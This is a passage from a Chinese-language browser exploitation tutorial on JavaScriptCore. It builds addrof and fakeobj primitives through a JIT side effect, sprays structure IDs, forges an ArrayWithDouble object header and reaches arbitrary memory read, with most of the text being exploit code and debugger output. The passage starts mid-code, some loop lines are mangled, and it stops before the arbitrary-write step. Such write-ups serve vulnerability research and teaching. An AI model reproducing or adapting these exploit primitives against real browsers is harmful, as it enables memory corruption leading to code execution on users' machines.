        var funcToJIT = function(array){
            'abc'.match(reg);
            array[0] = addr;
        }
        for(var i=0; i >> test = {};
    [object Object]
    >>> test_addr = f2i(addrof(test));
    4440391936
    >>> hex(test_addr)
    0x108ab0100
    >>> aaaa = fakeobj(i2f(test_addr))
    [object Object]
    >>> describe(aaaa)
    Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76
    >>> describe(test)
    Object: 0x108ab0100 with butterfly 0x0 (Structure 0x108af20d0:[Object, {}, NonArray, Proto:0x108ab4000]), StructureID: 76
    >>>
现在可以泄漏，可以伪造，那么就要想办法扩大我们的控制范围，尽量达到任意读写的目的。
现在`fakeobj()`传入任何地址JSC都会把它当作是一个对象的指针，那么我们就可以先泄漏出一个对象的地址，再在这个对象地址的基础上加上一个偏移，使得伪造对象地址处的数据变得可控，前面提到过对象的属性会存储在butterfly中，但是当该对象不是一个数组而且属性不超过6个的时候，就不会有butterfly，而是将这些属性的值存放在对象内部连续的内存中：
    >>> test = {}
    [object Object]
    >>> test.a = 5.2900040263529e-310
    5.2900040263529e-310
    >>> test.b = 2
    2
    >>> test.c = 3
    3
    >>> test.d = 4
    4
    >>> test.e = 5
    5
    >>> test.f = 6
    6
    >>> describe(test)
    Object: 0x108ab0280 with butterfly 0x0 (Structure 0x108a71260:[Object, {a:0, b:1, c:2, d:3, e:4, f:5}, NonArray, Proto:0x108ab4000, Leaf]), StructureID: 329
    >>>
可以看到`test`对象并没有butterfly，再来看看`test`内部：
    (lldb) x/10gx 0x108ab0280
    0x108ab0280: 0x0100160000000149 0x0000000000000000
    0x108ab0290: 0x0001616161616161 0xffff000000000002
    0x108ab02a0: 0xffff000000000003 0xffff000000000004
    0x108ab02b0: 0xffff000000000005 0xffff000000000006
    0x108ab02c0: 0x00000000badbeef0 0x00000000badbeef0
可以看到属性的值是被编码过的，这也提醒我们伪造数据的时候要减去0x10000000000。如果我们此时再增加属性，对象就会申请butterfly来存储数据，多余的属性值就会存储到butterfly中。
现在我们就可以开始伪造对象了，如果对JavaScript对象的结构还不是很了解的，推荐阅读：[Attacking JavaScript
Engines](http://phrack.org/papers/attacking_javascript_engines.html)。
###  Fake Object
伪造对象需要先伪造一个header，但是header中包含一个structureID，这个值不好预测而且必须要一个有效的ID才可以。这个时候就可以使用spray技术提前创建大量的对象。structureID虽然不好预测，但也不是随机的值，而是随着对象数量的增加而变大的。所以我们提前创建大量的对象，并选取一个中间的值作为structureID，大概率就是有效的。
    var spray = []
    for (var i = 0; i >> describe(spray[0])
    Object: 0x108ab4390 with butterfly 0x8000dc058 (Structure 0x108a70f50:[Array, {a:100, p0:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 322
    >>> describe(spray[999])
    Object: 0x108a14330 with butterfly 0x8000c3e08 (Structure 0x108a10e70:[Array, {a:100, p999:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 1321
    >>>
伪造的时候选取一个中间的值就可以了，其实这种方法还不是太稳，比较稳的做法是使用`instanceof`，不过只是练习就无所谓啦。
再看下spray出来的obj的header：
    (lldb) x/2gx 0x108ab4390
    0x108ab4390: 0x0108210700000142 0x00000008000dc058
header的数据就是`0x0108210700000142`，低四字节就是structrueID，高四字节就是flags，可以直接使用，可以认为这个flags表示的就是`ArrayWithDouble`（其实还包含了其他的信息）。伪造对象如下：
    u32[0] = 0x200;
    u32[1] = 0x01082107 - 0x10000;
    var header_arrayDouble = f64[0];
    victim = {
        fake_header:header_arrayDouble,
    };
    victim_addr = f2i(addrof(victim))
    hax = fakeobj(i2f(victim_addr+0x10))
    >>> describe(hax)
    Object: 0x1089c83b0 with butterfly 0x0 (Structure 0x10894a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x1089c80a0, Leaf]), StructureID: 512
    >>>
伪造对象成功之后，就可以进行进一步的操作了，现在可以通过`victim`控制`hax`的butterfly指向任意地址。但是现在有个问题，这个butterfly、必须是个合法的指针，然而我们是不可以通过正常方法往对象的属性写我们指定的指针的，唯一写指针进去的方法就是直接赋值一个对象。但如果对象是一个`ArrayWithDouble`，其实我们就可以通过写double的形式写一个double进去并伪造成指针，于是我们可以做以下的操作：
    controller = spray[500];
    victim = {
        fake_header:header_arrayDouble,
        fake_butterfly:controller
    };
    victim_addr = f2i(addrof(victim));
    hax = fakeobj(i2f(victim_addr+0x10));
    hax[1] = 5.2900040263529e-310;
    >>> describe(hax)
    Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512
    #查看hax的butterfly，其实也就是controller的内存
    (lldb) x/2gx 0x108ab62d0
    0x108ab62d0: 0x0108210700000337 0x0000616161616161
    (lldb)
这样我们就间接地控制了`controller`的butterfly，而且可以指向任意地址。然后通过访问`controller`的属性，我们其实已经可以实现任意地址读写了。比如访问`controller.a`其实就是读取controller的butterfly偏移为-0x10的值。现在来尝试一下读`hax`的内存：
    >>> hax[1] = i2f(f2i(addrof(hax))+0x10)
    2.193894026e-314
    >>> hex(f2i(controller.a))
    0x107210700000200
    >>> hax[1] = i2f(f2i(addrof(hax))+0x10+8)
    2.19389403e-314
    >>> hex(f2i(controller.a))
    0x7ff8000000000000
    >>> describe(hax)
    Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512
    (lldb) x/2gx 0x108ac83b0
    0x108ac83b0: 0x0108210700000200 0x0000000108ab62d0
    (lldb)
可以看到虽然可以读数据了，但是读的数据并不准确，首先第一个读出来的double是解码的，这个不难理解。奇怪的是第二个，`hax`的butterfly明明被指向了`controller`，这是一个合法的对象，应该是读不出来数据的，但是这里居然也能读，虽然数据是错的。既然这个是对象，其实我们完全可以用前面写好的`addrof()`来读：
    >>> hex(f2i(addrof(controller.a)))
    0x108ab62d0
这个读出来就是准确的，用同样的方法去读double的话其实还是会有解码的情况：
    >>> hex(f2i(addrof(controller.a)))
    0x107210700000200
造成这种情况的原因主要是我前面构造的`addrof()`，它返回的值肯定是JSValue解码后的结果，所以我们可以利用现在掌握的任意读写能力重新构造更稳定可靠的`addrof()`和`fakeobj()`，构造如下：
    var unboxed = [2.2];
    #防止unboxed成为CopyOnWriteArrayWithDouble，多赋值一次可确保ArrayWithDouble。
    unboxed[0] = 3.3;
    #boxed为ArrayWithContigous
    var boxed = [{}];
    #使boxed和unboxed的butterfly指向同一片内存，类似ArrayBuffer，我们就可以用不同的形式表示同一块内存。
    hax[1] = unboxed;
    var shared = controller[1];
    hax[1] = boxed;
    controller[1] = shared;
    #由于赋值过对象，hax的类型会变成ArrayWithContigous，重新设定类型方便之后赋值。
    victim.fake_header = header_arrayDouble;
    var stage2 = {
        addrof : function (obj){
            boxed[0] = obj;
            return f2i(unboxed[0]);
        },
        fakeobj : function (addr){
            unboxed[0] = i2f(addr);
            return boxed[0];
        },
        read64 : function (addr){
            hax[1] = i2f(addr+0x10);
            return stage2.addrof(controller.a);
        },
    };
我顺便写了负责任意读的方法`read64()`，可以试试效果：
    >>> stage2.read64(stage2.addrof(hax))
    74345707800101380
    >>> hex(74345707800101380)
    0x108210700000200
    >>> stage2.read64(stage2.addrof(hax)+8)
    4440416976
    >>> hex(4440416976)
    0x108ab62d0
    >>> describe(hax)
    Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p188:101}, ArrayWithDouble, Proto:0x108ac80a0]), StructureID: 512
    (lldb) x/2gx 0x108ac83b0
    0x108ac83b0: 0x0108210700000200 0x0000000108ab62d0
    (lldb)
这就很稳了，但其实有时候读double还不是很准，我猜测是因为精度问题，但其实问题不大。现在尝试构造一个任意写的方法：